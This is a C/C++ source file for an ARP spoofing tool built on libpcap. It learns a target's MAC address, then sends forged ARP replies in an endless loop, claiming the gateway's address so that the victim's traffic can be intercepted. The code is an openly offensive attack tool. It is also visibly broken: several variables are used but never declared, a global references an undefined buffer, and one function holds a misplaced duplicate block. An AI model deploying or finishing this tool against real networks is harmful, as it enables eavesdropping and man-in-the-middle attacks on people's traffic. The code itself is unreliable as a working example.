#include <sys/socket.h>
#include <sys/ioctl.h>
#include <linux/if.h>
#include <netdb.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <pcap.h>
#include "sendarp_header.h"


	int pointer = 0; // for tracing the offset.
    const Ethernet* ethernet = reinterpret_cast<const Ethernet *>(packet + pointer);

void get_mac();
void get_ip();
int send_packet(int opcode);
int get_packet();

unsigned char packet1[2000];
unsigned char packet2[2000];
unsigned char packet3[2000];
unsigned char packet4[2000];

unsigned char victim_mac_address[6] = {0};
unsigned char router_mac_address[6] = {0};
unsigned char my_mac_address[6] = {0};

unsigned char broad_mac_address[6] = {"\xff\xff\xff\xff\xff\xff"};
unsigned char zero_mac_address[6] = {"\x00\x00\x00\x00\x00\x00"};

unsigned char victim_ip[4] = {0}; 
unsigned char router_ip[4] = {0};
unsigned char my_ip[4] = {0};

unsigned char arp_dummy[] = "\x00\x01\x08\x00\x06\x04";
unsigned char arp_opcode_request[] = "\x00\x01";
unsigned char arp_opcode_reply[] = "\x00\x02";

int main(int argc, char* argv[])
{
    if (argc != 6) {
    usage();
    return -1;
  }
    get_mac();
    get_ip();
    
    do
        send_packet(1);
    while (get_packet() != 0);
    while(true) send_packet(2);
}


void get_mac(){
    struct ifreq s;
    int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);

    strcpy(s.ifr_name, "ens33");
    if (0 == ioctl(fd, SIOCGIFHWADDR, &s)) {

    memmove(my_mac_address, s.ifr_addr.sa_data, 6);

    for (int i = 0; i < 6; ++i)
      printf("%02x ", (unsigned char) my_mac_address[i]);
    putchar('\n');


 int fd;
 struct ifreq ifr;

 fd = socket(AF_INET, SOCK_DGRAM, 0);

 /* I want to get an IPv4 IP address */
 ifr.ifr_addr.sa_family = AF_INET;

 /* I want IP address attached to "eth0" */
 strncpy(ifr.ifr_name, "eth0", IFNAMSIZ-1);

 ioctl(fd, SIOCGIFADDR, &ifr);

 close(fd);

 /* display result */
 printf("%s\n", inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr));



  }
}

void get_ip(){
    unsigned char ip[4];
    printf("sender ip : ");
    scanf("%hhu.%hhu.%hhu.%hhu", &ip[0], &ip[1], &ip[2], &ip[3]);
    memmove(sender_ip,ip,4);
    
    printf("target ip : ");
    scanf("%hhu.%hhu.%hhu.%hhu", &ip[0], &ip[1], &ip[2], &ip[3]);
    memmove(target_ip,ip,4);
}

int send_packet(int opcode){
    pcap_t *fp;
    char errbuf[PCAP_ERRBUF_SIZE];
    unsigned char packet[200]={0};
    int pointer ;

    /* Open the output device */
    if ( (fp= pcap_open_live("ens33",         // name of the device(interface_name)
                        100,                // portion of the packet to capture (only the first 100 bytes)
                        1,                     // PCAP_OPENFLAG_PROMISCUOUS
                        1000,               // read timeout
                        errbuf              // error buffer
                        ) ) == NULL)
    {
        fprintf(stderr,"\nUnable to open the adapter. %s is not supported by WinPcap\n", "ens33");
        return -1;
    }
    
    pointer = 0;
    switch(opcode)
    {
        case 1:
            /* Make ethernet header */
            memmove(packet, broadcast_mac_address, 6);
            memmove(packet + 6, sender_mac_address, 6);
            memmove(packet + 12, "\x08\x06", 2);
            pointer += 14;

            /* Make Normal ARP header */
            memmove(packet + pointer, arp_dummy, 6);
            memmove(packet + pointer + 6, arp_opcode_request, 2);
            memmove(packet + pointer + 8, sender_mac_address, 6);
            memmove(packet + pointer + 14, sender_ip, 4);
            memmove(packet + pointer + 18, zero_mac_address, 6);
            memmove(packet + pointer + 24, target_ip, 4);
            break;

        case 2:
            /* Make ethernet header */
            memmove(packet, target_mac_address, 6);
            memmove(packet + 6, sender_mac_address, 6);
            memmove(packet + 12, "\x08\x06", 2);
            pointer += 14;

            /* Make Attack ARP header */
            memmove(packet + pointer, arp_dummy, 6);
            memmove(packet + pointer + 6, arp_opcode_reply, 2);
            memmove(packet + pointer + 8, sender_mac_address, 6);
            memmove(packet + pointer + 14, sender_ip, 3);
            memmove(packet + pointer + 17, "\x01", 1);                 // supposed router has X.X.X.1 address.
            memmove(packet + pointer + 18, target_mac_address, 6);
            memmove(packet + pointer + 24, target_ip, 4);
            break;
    }

    /* Send down the packet */
    if (pcap_sendpacket(fp, packet, 42 /* size */) != 0)
    {
        fprintf(stderr,"\nError sending the packet: %s \n", pcap_geterr(fp));
        return 1;
    }
    printf("packet send!\n");
    return 0;
}

int get_packet(){
    const char *dev = "ens33";
      char errbuf[PCAP_ERRBUF_SIZE];
      pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
      if (handle == NULL) {
        fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
        return -1;
         }
    printf("1");
    int i = 0;
    while (i <5) {
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) return 1;
        if (res == -1 || res == -2) return 1;

        if(!memcmp(target_ip, packet + 28, 4)){
            memmove(target_mac_address,packet+22,6);         // packet + 22 = target_mac_address
            printf("Gotcha! I Got the target mac addr.\n");
            return 0;
            }
        i++;
        }
    return 1;
}

